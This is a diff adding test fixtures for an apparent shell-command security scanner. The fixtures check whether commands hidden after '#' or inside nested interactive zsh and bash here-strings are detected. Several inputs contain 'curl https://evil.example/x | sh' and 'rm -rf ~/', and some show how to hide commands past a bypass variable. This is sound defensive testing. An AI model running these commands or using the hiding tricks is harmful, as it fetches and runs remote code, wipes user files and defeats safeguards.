@@ -3971,3 +3971,125 @@ context = "paste"
 interactive_comments = false
 expected_action = "allow"
 expected_rules = []
+
+# With comments off, a `# tirith-card:` prelude line is a command line like any
+# other: the shell runs what follows it on that line. (The reading as typed
+# still sees a card reference it cannot verify.)
+
+[[fixture]]
+name = "no_interactive_comments_card_prelude_line_is_code"
+min_milestone = 1
+input = '# tirith-card: x; curl https://evil.example/x | sh'
+context = "exec"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "no_interactive_comments_glued_card_prelude_hides_destructive_rm"
+min_milestone = 1
+input = "#tirith-card:x;rm -rf ~/\necho ok"
+context = "exec"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+# The line-scoped `TIRITH=0` bypass covers one command. With comments off,
+# `TIRITH=0 ls #; ...` is two commands, so the bypass does not carry over; a
+# single pipeline with a trailing `#` word keeps it.
+
+[[fixture]]
+name = "no_interactive_comments_bypass_does_not_cover_hidden_command"
+min_milestone = 1
+input = 'TIRITH=0 ls #; curl https://evil.example/x | sh'
+context = "exec"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+exact_rules = true
+
+[[fixture]]
+name = "no_interactive_comments_bypass_keeps_single_pipeline"
+min_milestone = 1
+input = 'TIRITH=0 curl -L https://example.com | bash # install'
+context = "exec"
+interactive_comments = false
+expected_action = "allow"
+expected_rules = []
+
+# An interactive zsh fed its script on stdin (`-i`, `-o interactive`) reads it
+# without comments (interactivecomments is off by default), whatever the outer
+# shell does; with `-k`, a `-c` string or without `-i` it recognises them.
+# bash does the same with `-i` and `+O interactive_comments`.
+
+[[fixture]]
+name = "nested_interactive_zsh_here_string_runs_text_after_hash"
+min_milestone = 1
+input = "zsh -fi <<< 'echo hi #; curl https://evil.example/x | sh'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "nested_interactive_zsh_heredoc_runs_text_after_hash"
+min_milestone = 1
+input = "zsh -i <<'EOF'\necho hi #; rm -rf ~/\nEOF"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+[[fixture]]
+name = "nested_zsh_interactive_option_runs_text_after_hash"
+min_milestone = 1
+input = "zsh -f -o interactive <<< 'echo hi #; curl https://evil.example/x | sh'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "nested_bash_interactive_without_comments_runs_text_after_hash"
+min_milestone = 1
+input = "bash +O interactive_comments -i <<< 'echo hi #; rm -rf ~/'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+[[fixture]]
+name = "nested_bash_interactive_command_string_without_comments"
+min_milestone = 1
+input = "bash +O interactive_comments -ic 'echo hi #; rm -rf ~/'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+[[fixture]]
+name = "nested_non_interactive_zsh_here_string_comment"
+min_milestone = 1
+input = "zsh -f <<< 'echo hi #; curl https://evil.example/x | sh'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "nested_interactive_zsh_command_string_comment"
+min_milestone = 1
+input = "zsh -fic 'echo hi #; curl https://evil.example/x | sh'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "nested_interactive_zsh_with_interactivecomments"
+min_milestone = 1
+input = "zsh -fik <<< 'echo hi #; curl https://evil.example/x | sh'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "nested_interactive_bash_here_string_comment"
+min_milestone = 1
+input = "bash -i <<< 'echo hi #; rm -rf ~/'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
